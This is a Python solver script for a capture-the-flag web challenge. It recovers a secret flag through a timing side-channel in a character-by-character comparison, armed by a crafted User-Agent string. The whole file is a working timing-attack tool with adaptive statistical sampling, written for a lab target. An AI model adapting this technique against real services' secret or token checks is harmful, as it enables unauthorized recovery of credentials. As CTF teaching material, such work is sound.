#!/usr/bin/env python3
"""Timing side-channel solver for web/flagchecker (CSAW 2026 Quals).

Vulnerability
-------------
`/check` compares the submitted flag to the real flag with `inputval.Flag.__eq__`,
which sleeps ~10 ms per matching LEADING character — but ONLY when the request's
User-Agent encodes a Chrome version whose build*patch == 1,000,000. The UA
"Chrome/100.0.1000.1000" gives build=1000, patch=1000 -> 1,000,000, arming the
timing oracle (see bot_check() storing _store.build / _store.patch, and the UA
gate the challenge ships).

Because the sleep is proportional to the length of the correct prefix, we recover
the flag one character at a time: for each position, submit <known_prefix>+<c> for
every candidate c and keep the one with the largest median response time. The flag
is extracted purely from timing; nothing reads it from the server's env/metadata.

Run
---
    python3 solve_flagchecker.py http://HOST:PORT/check
(usage note: run the service single-worker for clean timing, e.g.
 gunicorn -w 1 ...; see run_in_vm.sh alongside this file.)
"""
import random
import statistics
import sys
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/100.0.1000.1000 Safari/537.36")
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_{}@!?.-"
KNOWN_PREFIX = "csaw{"
# Adaptive sampling: start cheap, escalate only for ambiguous positions.
SAMPLE_SCHEDULE = (9, 25, 61, 121)
MARGIN_MS = 3.0  # stop escalating once best vs runner-up differ by this much


def timed_post(url, flag):
    import time
    data = ("flag=" + urllib.parse.quote(flag)).encode()
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"User-Agent": UA,
                                          "Content-Type": "application/x-www-form-urlencoded"})
    t0 = time.perf_counter()
    try:
        urllib.request.urlopen(req, timeout=30).read()
    except Exception:
        pass
    return time.perf_counter() - t0


def min_time(url, flag, n):
    # Noise from scheduling/network only ever ADDS delay, so the minimum over
    # many trials is a much cleaner estimator of the true (baseline + sleep)
    # time than the median once the per-char signal (~10ms) gets small
    # relative to jitter.
    return min(timed_post(url, flag) for _ in range(n))


def best_char(url, known):
    """Adaptive per-position search: keep each candidate's best-seen time
    across escalating sample counts, stop escalating once the top two
    candidates are clearly separated (or we hit the sample cap)."""
    candidates = list(CHARSET)
    best = {c: float("inf") for c in candidates}
    prev_n = 0
    for n in SAMPLE_SCHEDULE:
        extra = n - prev_n
        for c in candidates:
            t = min_time(url, known + c, extra)
            best[c] = min(best[c], t)
        prev_n = n
        ranked = sorted(best.items(), key=lambda kv: kv[1], reverse=True)
        top_c, top_t = ranked[0]
        second_t = ranked[1][1]
        margin = (top_t - second_t) * 1000
        if margin >= MARGIN_MS:
            return top_c, ranked[:3], n
        # narrow the field to the top performers for the next, pricier round
        keep = max(6, len(candidates) // 2)
        candidates = [c for c, _ in ranked[:keep]]
    return ranked[0][0], ranked[:3], prev_n


def solve(url):
    import urllib.parse  # noqa: F401  (used in timed_post)
    for _ in range(3):
        timed_post(url, "x")  # warm up
    known = KNOWN_PREFIX
    print("[*] start %r  (adaptive %s samples/char)" % (known, SAMPLE_SCHEDULE), flush=True)
    while not known.endswith("}") and len(known) < 80:
        best, top, used_n = best_char(url, known)
        print("[+] pos %2d: %r  (n=%d)  top3: %s" % (
            len(known), best, used_n,
            "  ".join("%r %.1fms" % (c, t * 1000) for c, t in top)), flush=True)
        known += best
    print("\n[*] FLAG: %s" % known, flush=True)
    return known


if __name__ == "__main__":
    import urllib.parse
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000/check"
    if len(sys.argv) > 2:
        # Resume from an already-measured-correct prefix (e.g. after an
        # earlier run of this same script established it with clear timing
        # margins) instead of re-deriving it from scratch.
        KNOWN_PREFIX = sys.argv[2]
    solve(url)
